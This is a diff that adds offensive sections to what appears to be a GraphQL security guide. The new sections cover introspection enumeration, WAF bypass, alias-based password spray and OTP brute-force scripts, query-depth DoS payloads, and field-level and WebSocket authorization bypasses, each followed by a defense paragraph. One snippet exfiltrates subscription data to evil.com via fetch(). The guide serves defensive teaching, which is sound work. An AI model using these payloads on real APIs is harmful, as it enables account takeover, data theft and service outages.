@@ -485,6 +485,182 @@ mutation {
       </div>
     </section>
 
+    <section id="introspection-depth">
+      <h2>Deep Introspection Abuse</h2>
+      <p>Even when introspection is "disabled" in production, partial fingerprinting often still works. The standard <code>__schema</code> query may be blocked while <code>__type</code> on individual types still resolves. Field-suggestion errors ("Did you mean...?") leak schema structure one query at a time.</p>
+
+      <h3>Walk the type graph one node at a time</h3>
+      <pre><code># If __schema is blocked, try __type on guessed type names
+{ __type(name: "User") { fields { name type { name kind ofType { name } } } } }
+{ __type(name: "AdminUser") { fields { name } } }
+{ __type(name: "InternalNote") { fields { name } } }
+
+# Enumerate available queries / mutations / subscriptions
+{ __schema { queryType { fields { name args { name type { name } } } } } }
+{ __schema { mutationType { fields { name } } } }
+{ __schema { subscriptionType { fields { name } } } }</code></pre>
+
+      <h3>Field-suggestion oracle (works even with introspection disabled)</h3>
+      <pre><code># Submit a misspelled field; the error response leaks the real field name
+{ user(id: 1) { naam } }
+# Response: "Cannot query field 'naam' on type 'User'. Did you mean 'name'?"
+
+# Walk every type by submitting `xxxxxxx` and harvesting suggestions
+for field in $(cat fieldlist.txt); do
+  curl -s -X POST https://example.com/graphql \
+    -H 'Content-Type: application/json' \
+    -d "{\"query\":\"{ user(id:1) { ${field}xxxxx } }\"}" \
+    | jq -r '.errors[]?.message' | grep -oE "Did you mean '[^']+'"
+done</code></pre>
+
+      <h3>Alias-obfuscated introspection (WAF bypass)</h3>
+      <pre><code># If the WAF blocks "__schema" literally, alias it
+{ s: __schema { types { name } } }
+
+# Or fragment it so the literal token doesn't appear contiguously
+{ ...IntroFrag } fragment IntroFrag on Query { __schema { types { name } } }</code></pre>
+
+      <p><strong>Defense:</strong> blocking <code>__schema</code> alone is insufficient; also block <code>__type</code> in production, disable verbose error messages (set <code>didYouMean: false</code> in Apollo, similar in graphql-js), and rate-limit per-IP error responses to slow the suggestion-oracle.</p>
+    </section>
+
+    <section id="alias-batching">
+      <h2>Alias-Based Batching Attacks</h2>
+      <p>GraphQL aliases let one HTTP request execute many independent operations. From the server's rate-limiter point of view it's <em>one</em> request — bypassing per-request rate limits on login attempts, OTP submissions, coupon codes, and password-reset tokens.</p>
+
+      <h3>Password spray via 1000 aliases per request</h3>
+      <pre><code>{
+  a1: login(email: "victim@example.com", password: "Spring2026!") { token }
+  a2: login(email: "victim@example.com", password: "Summer2026!") { token }
+  a3: login(email: "victim@example.com", password: "Welcome123!") { token }
+  # ... 997 more aliases
+  a1000: login(email: "victim@example.com", password: "P@ssw0rd!") { token }
+}</code></pre>
+
+      <h3>OTP brute-force on a 6-digit code</h3>
+      <pre><code># Generate 1,000,000 aliases, each guessing one OTP value
+python3 -c '
+print("{")
+for i in range(1000000):
+    print(f"  a{i}: verifyOtp(code: \"{i:06d}\") {{ ok }}")
+print("}")
+' > otp-spray.graphql
+
+curl -X POST https://example.com/graphql \
+  -H 'Content-Type: application/json' \
+  --data-binary @otp-spray.graphql</code></pre>
+
+      <p><strong>Defense:</strong> per-query cost analysis with alias-counted complexity (<code>graphql-cost-analysis</code>, <code>graphql-query-complexity</code>), per-mutation rate limits (count <em>operations</em>, not requests), and persisted queries for production traffic so arbitrary client-supplied query bodies are rejected.</p>
+    </section>
+
+    <section id="query-cost-dos">
+      <h2>Query Depth / Cost DoS</h2>
+      <p>GraphQL's flexibility lets a tiny request explode into massive server work. Recursive relationships, field multiplication, and unbounded list arguments are the three primary vectors.</p>
+
+      <h3>Recursive depth bomb (friends-of-friends-of-friends)</h3>
+      <pre><code>{
+  user(id: 1) {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends { friends { friends { friends { id } } } }
+          }
+        }
+      }
+    }
+  }
+}</code></pre>
+
+      <h3>Field multiplication blow-up (1k × 1k × 1k = 1B objects)</h3>
+      <pre><code>{
+  users(first: 1000) {
+    posts(first: 1000) {
+      comments(first: 1000) {
+        author { name email }
+      }
+    }
+  }
+}</code></pre>
+
+      <h3>Unbounded list argument</h3>
+      <pre><code>{ search(query: "*", limit: 999999999) { results { id title } } }</code></pre>
+
+      <p><strong>Defense:</strong> static query-depth limit (e.g. 7) via <code>graphql-depth-limit</code>; dynamic cost-analysis with per-query budget (Apollo's <code>maxCost</code>); pagination required on every list field (no implicit "all" semantics); query timeout at the resolver layer (e.g. 5 seconds). GitHub's GraphQL API enforces a <em>per-query node limit</em> of 500,000 — most internal APIs enforce nothing.</p>
+    </section>
+
+    <section id="field-auth-bypass">
+      <h2>Field-Level Authorization Bypass</h2>
+      <p>The most common GraphQL auth bug: authentication is checked at the resolver root (<code>me</code>, <code>user(id)</code>) but nested fields don't re-check. The user can pivot from a permitted root to a forbidden field via relationship traversal.</p>
+
+      <h3>Pivot from `me` to other users' SSNs via friends</h3>
+      <pre><code># Allowed (root-level auth passes — you're querying your own user)
+{ me { name email } }
+
+# Bypass: traverse relationship to harvest sensitive fields on OTHER users
+{
+  me {
+    friends {
+      id
+      name
+      email
+      ssn
+      passwordResetToken    # if exposed, full account takeover
+    }
+  }
+}</code></pre>
+
+      <h3>Mutation-arg trust assumption</h3>
+      <pre><code># Naive resolver checks "is this user logged in?" but not "do they own this id?"
+mutation { updateProfile(userId: 999, role: "ADMIN") { success } }</code></pre>
+
+      <h3>Hidden admin fields exposed via type traversal</h3>
+      <pre><code># `internalNotes` was meant to be admin-only, but is exposed on User type;
+# regular users can read other users' notes via friends.internalNotes
+{ me { friends { internalNotes { body createdBy } } } }</code></pre>
+
+      <p><strong>Defense:</strong> field-level authorization (per-resolver auth checks, not just root); GraphQL Shield middleware to declare auth policies declaratively; schema-level <code>@auth(role: ADMIN)</code> directives; explicit denylist for sensitive fields like <code>passwordHash</code>, <code>resetToken</code>, <code>mfaSecret</code>; integration tests that exercise nested traversal paths, not just direct queries.</p>
+    </section>
+
+    <section id="subscription-auth">
+      <h2>Subscription / WebSocket Auth Bypass</h2>
+      <p>GraphQL subscriptions usually run over WebSocket (<code>graphql-ws</code> or the legacy <code>subscriptions-transport-ws</code>). The HTTP handshake's auth context often doesn't carry into the WS connection — and the per-subscription auth check is frequently missing entirely.</p>
+
+      <h3>Connect without auth, then subscribe to anyone's events</h3>
+      <pre><code>// Browser console — no auth headers, no cookies
+const ws = new WebSocket('wss://example.com/graphql', 'graphql-transport-ws');
+ws.onopen = () => {
+  ws.send(JSON.stringify({ type: 'connection_init', payload: {} })); // empty payload
+};
+ws.onmessage = (e) => {
+  const m = JSON.parse(e.data);
+  if (m.type === 'connection_ack') {
+    // Subscribe to victim's notifications — server doesn't validate user_id
+    ws.send(JSON.stringify({
+      id: '1',
+      type: 'subscribe',
+      payload: { query: 'subscription { newMessage(userId: 999) { body sender } }' }
+    }));
+  }
+  if (m.type === 'next') console.log('LEAKED:', m.payload.data);
+};</code></pre>
+
+      <h3>Origin-header bypass</h3>
+      <pre><code># WebSocket connections have NO same-origin policy by default
+# (it must be explicitly checked server-side via Origin header)
+# Attacker page on evil.com:
+new WebSocket('wss://example.com/graphql')
+  .onmessage = e => fetch('https://evil.com/log?d=' + btoa(e.data))</code></pre>
+
+      <h3>connection_init payload trust assumption</h3>
+      <pre><code>// Some servers trust the auth payload from the client at connection time
+ws.send(JSON.stringify({
+  type: 'connection_init',
+  payload: { authToken: 'forged-or-stolen-token', userId: 1 }  // <-- trusted as-is
+}));</code></pre>
+
+      <p><strong>Defense:</strong> validate the JWT or session cookie inside the <code>connection_init</code> handler (don't just accept arbitrary <code>authToken</code> claims); re-validate on every <code>subscribe</code> message; scope subscription filters to the authenticated user's id (server-side, not client-arg); validate the <code>Origin</code> header against an allowlist; rate-limit subscriptions per user.</p>
+    </section>
+
     <section id="remediation">
       <h2>Remediation</h2>
 
